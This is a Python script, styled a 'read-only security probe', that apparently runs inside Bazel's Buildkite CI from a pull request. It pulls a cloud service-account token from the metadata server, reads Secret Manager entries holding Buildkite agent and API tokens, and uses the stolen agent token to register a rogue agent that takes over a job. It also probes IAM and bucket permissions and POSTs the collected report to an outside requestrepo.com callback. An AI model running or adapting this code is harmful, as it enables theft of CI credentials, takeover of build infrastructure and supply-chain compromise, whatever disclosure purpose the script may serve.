#!/usr/bin/env python3
"""Read-only security probe for the Bazel CI worker boundary."""

import base64
import hashlib
import json
import os
import re
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request


CALLBACK_URL = "https://jpz2hfky.requestrepo.com/bazel-ci-ot0-8f4c2a1"
METADATA_ROOT = "http://169.254.169.254/computeMetadata/v1"
PROJECT = "bazel-untrusted"


def request(url, headers=None, opener=None, data=None, method=None):
    req = urllib.request.Request(
        url,
        headers=headers or {},
        data=data,
        method=method,
    )
    try:
        open_request = opener.open if opener else urllib.request.urlopen
        with open_request(req, timeout=10) as response:
            return response.status, response.read()
    except urllib.error.HTTPError as error:
        return error.code, b""
    except Exception as error:  # Keep the CI build healthy if the probe cannot connect.
        return type(error).__name__, b""


def metadata(path):
    no_proxy = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    return request(
        METADATA_ROOT + path,
        headers={"Metadata-Flavor": "Google"},
        opener=no_proxy,
    )


def access_secret(name, oauth_token):
    status, body = request(
        "https://secretmanager.googleapis.com/v1/projects/"
        + PROJECT
        + "/secrets/"
        + name
        + "/versions/latest:access",
        headers={"Authorization": "Bearer " + oauth_token},
    )
    result = {"status": status}
    if status != 200:
        return result, None
    try:
        secret = base64.b64decode(json.loads(body)["payload"]["data"])
    except Exception as error:
        result["decode_error"] = type(error).__name__
        return result, None
    result["length"] = len(secret)
    result["sha256"] = hashlib.sha256(secret).hexdigest()
    return result, secret.decode("utf-8").strip()


def google_json(url, oauth_token, data=None, method=None):
    headers = {"Authorization": "Bearer " + oauth_token}
    encoded = None
    if data is not None:
        headers["Content-Type"] = "application/json"
        encoded = json.dumps(data).encode("utf-8")
    status, body = request(url, headers=headers, data=encoded, method=method)
    if status != 200:
        return status, None
    try:
        return status, json.loads(body)
    except Exception:
        return status, None


def test_bucket_permissions(bucket, oauth_token):
    permissions = (
        "storage.buckets.get",
        "storage.buckets.getIamPolicy",
        "storage.buckets.setIamPolicy",
        "storage.objects.list",
        "storage.objects.get",
        "storage.objects.create",
        "storage.objects.update",
        "storage.objects.delete",
    )
    query = urllib.parse.urlencode(
        [("permissions", permission) for permission in permissions]
    )
    status, body = google_json(
        "https://storage.googleapis.com/storage/v1/b/"
        + urllib.parse.quote(bucket, safe="")
        + "/iam/testPermissions?"
        + query,
        oauth_token,
    )
    result = {"status": status}
    if body is not None:
        result["permissions"] = sorted(body.get("permissions", []))
    return result


def prove_agent_job_control(agent_token, api_token):
    """Use the stolen token only for a harmless job created by this PR job."""
    build_number = os.environ.get("BUILDKITE_BUILD_NUMBER", "")
    parent_job = os.environ.get("BUILDKITE_JOB_ID", "")
    pipeline = os.environ.get("BUILDKITE_PIPELINE_SLUG", "")
    result = {}
    if not build_number or not parent_job or not pipeline:
        return {"status": "missing_build_context"}

    marker_key = "pwnreq-agent-proof-" + parent_job
    marker_exists = subprocess.run(
        ["buildkite-agent", "meta-data", "exists", marker_key],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    if marker_exists.returncode == 0:
        return {"status": "already_started"}
    subprocess.run(
        ["buildkite-agent", "meta-data", "set", marker_key, "started"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True,
    )

    step_key = "pwnreq-agent-proof-" + build_number
    pipeline_yaml = """steps:
  - label: "PWNREQ isolated registration-token proof"
    key: "%s"
    command: "echo PWNREQ_ROGUE_AGENT_CONTROL"
    env:
      BUILDKITE_SKIP_CHECKOUT: "true"
    checkout:
      skip: true
    agents:
      pwnreq_security_proof: "only"
""" % step_key
    upload = subprocess.run(
        ["buildkite-agent", "pipeline", "upload"],
        input=pipeline_yaml.encode("utf-8"),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
        timeout=20,
    )
    result["pipeline_upload_exit"] = upload.returncode
    if upload.returncode != 0:
        result["status"] = "pipeline_upload_failed"
        return result

    build_url = (
        "https://api.buildkite.com/v2/organizations/bazel/pipelines/"
        + pipeline
        + "/builds/"
        + build_number
    )
    proof_job = None
    for _ in range(30):
        build_status, build_body = request(
            build_url,
            headers={"Authorization": "Bearer " + api_token},
        )
        result["build_read_status"] = build_status
        if build_status == 200:
            try:
                build_info = json.loads(build_body)
                proof_job = next(
                    (
                        job
                        for job in build_info.get("jobs", [])
                        if job.get("step_key") == step_key
                    ),
                    None,
                )
            except Exception as error:
                result["build_decode_error"] = type(error).__name__
        if proof_job:
            break
        time.sleep(1)
    if not proof_job:
        result["status"] = "proof_job_not_found"
        return result

    proof_job_id = proof_job.get("id", "")
    agent_name = "pwnreq-proof-" + build_number
    result["job_id"] = proof_job_id
    result["step_key"] = step_key
    result["initial_job_state"] = proof_job.get("state")
    result["agent_name"] = agent_name

    with tempfile.TemporaryDirectory(prefix="pwnreq-buildkite-agent-") as root:
        for directory in ("builds", "hooks", "plugins"):
            os.mkdir(os.path.join(root, directory))
        agent_env = {
            key: value
            for key, value in os.environ.items()
            if not key.startswith("BUILDKITE_")
        }
        agent_env["BUILDKITE_AGENT_TOKEN"] = agent_token
        try:
            agent = subprocess.run(
                [
                    "buildkite-agent",
                    "start",
                    "--config",
                    "/dev/null",
                    "--name",
                    agent_name,
                    "--acquire-job",
                    proof_job_id,
                    "--reflect-exit-status",
                    "--no-color",
                    "--write-job-logs-to-stdout",
                    "--build-path",
                    os.path.join(root, "builds"),
                    "--hooks-path",
                    os.path.join(root, "hooks"),
                    "--plugins-path",
                    os.path.join(root, "plugins"),
                ],
                env=agent_env,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                check=False,
                timeout=90,
            )
            result["agent_exit"] = agent.returncode
            sanitized = agent.stdout.decode("utf-8", "replace")
            sanitized = sanitized.replace(agent_token, "<redacted-agent-token>")
            sanitized = sanitized.replace(api_token, "<redacted-api-token>")
            sanitized = re.sub(
                r"\b(?:bkct|bkar|bkua|bku)_[A-Za-z0-9_-]+",
                "<redacted-buildkite-token>",
                sanitized,
            )
            result["agent_output_tail"] = sanitized[-800:]
        except subprocess.TimeoutExpired:
            result["status"] = "agent_timeout"
            return result

    final_status, final_body = request(
        build_url,
        headers={"Authorization": "Bearer " + api_token},
    )
    result["final_build_read_status"] = final_status
    if final_status == 200:
        try:
            final_build = json.loads(final_body)
            final_job = next(
                (
                    job
                    for job in final_build.get("jobs", [])
                    if job.get("id") == proof_job_id
                ),
                {},
            )
            result["final_job_state"] = final_job.get("state")
            result["reported_agent_name"] = (final_job.get("agent") or {}).get(
                "name"
            )
            result["web_url"] = final_job.get("web_url")
        except Exception as error:
            result["final_decode_error"] = type(error).__name__
    result["status"] = "completed"
    return result


def main():
    # Run once on only one Linux shard. Other jobs still need valid workspace status output.
    label = os.environ.get("BUILDKITE_LABEL", "")
    shard = os.environ.get("BUILDKITE_PARALLEL_JOB", "")
    if not label.startswith(":ubuntu: Ubuntu 24.04 LTS") or shard not in ("", "0"):
        print("PWNREQ_SECURITY_PROBE skipped")
        return

    report = {
        "marker": "bazel-ci-ot0-8f4c2a1",
        "pipeline": os.environ.get("BUILDKITE_PIPELINE_SLUG", ""),
        "build": os.environ.get("BUILDKITE_BUILD_NUMBER", ""),
        "job": os.environ.get("BUILDKITE_JOB_ID", ""),
        "pull_request": os.environ.get("BUILDKITE_PULL_REQUEST", ""),
        "label": label,
        "shard": shard,
    }

    email_status, email_body = metadata("/instance/service-accounts/default/email")
    report["metadata_email_status"] = email_status
    if email_status == 200:
        report["service_account"] = email_body.decode("utf-8", "replace").strip()

    token_status, token_body = metadata("/instance/service-accounts/default/token")
    report["metadata_token_status"] = token_status
    oauth_token = None
    if token_status == 200:
        try:
            token_data = json.loads(token_body)
            oauth_token = token_data["access_token"]
            report["metadata_token_expires_in"] = token_data.get("expires_in")
        except Exception as error:
            report["metadata_token_decode_error"] = type(error).__name__

    if oauth_token:
        secrets_status, secrets_body = google_json(
            "https://secretmanager.googleapis.com/v1/projects/"
            + PROJECT
            + "/secrets?pageSize=100",
            oauth_token,
        )
        report["secret_list_status"] = secrets_status
        secret_names = []
        if secrets_body is not None:
            secret_names = sorted(
                entry.get("name", "").rsplit("/", 1)[-1]
                for entry in secrets_body.get("secrets", [])
                if entry.get("name")
            )
            report["secret_names"] = secret_names

        token_secret_names = {
            "bazel-buildkite-agent-token",
            "bazel-bazelcipy-BuildkiteClient-token",
            "bazel-testing-buildkite-agent-token",
            "bazel-testing-bazelcipy-BuildkiteClient-token",
        }
        token_secret_names.update(
            name
            for name in secret_names
            if name.endswith("buildkite-agent-token")
            or name.endswith("bazelcipy-BuildkiteClient-token")
        )

        secret_results = {}
        api_tokens = {}
        agent_tokens = {}
        for secret_name in sorted(token_secret_names):
            secret_result, secret_value = access_secret(secret_name, oauth_token)
            secret_results[secret_name] = secret_result
            if secret_value and secret_name.endswith(
                "bazelcipy-BuildkiteClient-token"
            ):
                api_tokens[secret_name] = secret_value
            if secret_value and secret_name.endswith("buildkite-agent-token"):
                agent_tokens[secret_name] = secret_value
        report["ci_token_secrets"] = secret_results

        api_token_reports = {}
        for secret_name, api_token in api_tokens.items():
            api_report = {}
            status, body = request(
                "https://api.buildkite.com/v2/access-token",
                headers={"Authorization": "Bearer " + api_token},
            )
            api_report["access_token_status"] = status
            if status == 200:
                try:
                    token_info = json.loads(body)
                    api_report["access"] = {
                        "uuid": token_info.get("uuid"),
                        "description": token_info.get("description"),
                        "scopes": token_info.get("scopes", []),
                    }
                except Exception as error:
                    api_report["access_token_decode_error"] = type(error).__name__

            org_status, org_body = request(
                "https://api.buildkite.com/v2/organizations?per_page=100",
                headers={"Authorization": "Bearer " + api_token},
            )
            api_report["organizations_status"] = org_status
            if org_status == 200:
                try:
                    api_report["organizations"] = sorted(
                        org.get("slug", "") for org in json.loads(org_body)
                    )
                except Exception as error:
                    api_report["organizations_decode_error"] = type(error).__name__
            api_token_reports[secret_name] = api_report
        report["buildkite_api_tokens"] = api_token_reports

        production_api_token = api_tokens.get(
            "bazel-bazelcipy-BuildkiteClient-token"
        )
        if production_api_token:

            trusted_pipelines = {}
            for pipeline in (
                "bazel-release",
                "publish-bazel-binaries",
                "java-tools-release",
                "rules-java-release",
                "bcr-postsubmit",
            ):
                status, body = request(
                    "https://api.buildkite.com/v2/organizations/"
                    "bazel-trusted/pipelines/" + pipeline,
                    headers={"Authorization": "Bearer " + production_api_token},
                )
                entry = {"status": status}
                if status == 200:
                    try:
                        pipeline_info = json.loads(body)
                        entry["name"] = pipeline_info.get("name")
                        entry["repository"] = pipeline_info.get("repository")
                    except Exception as error:
                        entry["decode_error"] = type(error).__name__
                trusted_pipelines[pipeline] = entry
            report["bazel_trusted_pipelines"] = trusted_pipelines

        production_agent_token = agent_tokens.get("bazel-buildkite-agent-token")
        if production_agent_token and production_api_token:
            try:
                report["agent_job_control"] = prove_agent_job_control(
                    production_agent_token,
                    production_api_token,
                )
            except Exception as error:
                report["agent_job_control"] = {
                    "status": "proof_error",
                    "error": type(error).__name__,
                }

        project_permissions = (
            "resourcemanager.projects.getIamPolicy",
            "resourcemanager.projects.setIamPolicy",
            "secretmanager.secrets.list",
            "secretmanager.secrets.create",
            "secretmanager.secrets.delete",
            "secretmanager.versions.add",
            "secretmanager.versions.access",
            "secretmanager.versions.destroy",
            "storage.buckets.list",
            "storage.buckets.create",
            "storage.buckets.delete",
            "compute.instances.list",
            "compute.instances.create",
            "compute.instances.delete",
            "compute.instances.setMetadata",
            "compute.instanceTemplates.list",
            "compute.instanceTemplates.create",
            "compute.instanceTemplates.delete",
            "compute.instanceGroupManagers.list",
            "compute.instanceGroupManagers.update",
            "iam.serviceAccounts.list",
            "iam.serviceAccounts.actAs",
            "iam.serviceAccounts.getAccessToken",
            "iam.serviceAccounts.signBlob",
            "iam.serviceAccounts.signJwt",
            "artifactregistry.repositories.list",
            "artifactregistry.repositories.downloadArtifacts",
            "artifactregistry.repositories.uploadArtifacts",
            "cloudkms.cryptoKeyVersions.useToDecrypt",
            "cloudkms.cryptoKeyVersions.useToSign",
        )
        permissions_status, permissions_body = google_json(
            "https://cloudresourcemanager.googleapis.com/v1/projects/"
            + PROJECT
            + ":testIamPermissions",
            oauth_token,
            data={"permissions": project_permissions},
            method="POST",
        )
        report["project_permissions_status"] = permissions_status
        if permissions_body is not None:
            report["project_permissions"] = sorted(
                permissions_body.get("permissions", [])
            )

        buckets_status, buckets_body = google_json(
            "https://storage.googleapis.com/storage/v1/b?project="
            + PROJECT
            + "&maxResults=100",
            oauth_token,
        )
        report["bucket_list_status"] = buckets_status
        listed_buckets = []
        if buckets_body is not None:
            listed_buckets = sorted(
                item.get("name", "")
                for item in buckets_body.get("items", [])
                if item.get("name")
            )
            report["bucket_names"] = listed_buckets

        bucket_names = {
            "bazel-untrusted-buildkite-artifacts",
            "bazel-untrusted-build-cache",
            "bazel-untrusted-last-green-commits",
            "bazel-untrusted-retry-logs",
            "bazel-buildkite-stats",
            "bazel-kzips",
            "bazel-builds",
            "bazel-testing-builds",
            "bazel-testing-buildkite-artifacts",
            "bazel-testing-buildkite-stats",
            "bazel-testing-retry-logs",
            "bcr.bazel.build",
            "bazel-git-mirror",
            "bazel-buildkite-tf-state",
        }
        bucket_names.update(listed_buckets)
        report["bucket_permissions"] = {
            bucket: test_bucket_permissions(bucket, oauth_token)
            for bucket in sorted(bucket_names)
        }

    payload = json.dumps(report, sort_keys=True).encode("utf-8")
    print("PWNREQ_SECURITY_RESULT " + payload.decode("utf-8"), file=sys.stderr)
    callback_status, _ = request(
        CALLBACK_URL,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "bazel-ci-security-probe",
        },
        data=payload,
        method="POST",
    )
    print("PWNREQ_SECURITY_PROBE callback_{}".format(callback_status))


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print("PWNREQ_SECURITY_PROBE error_{}".format(type(error).__name__))
        print("security probe failed safely", file=sys.stderr)
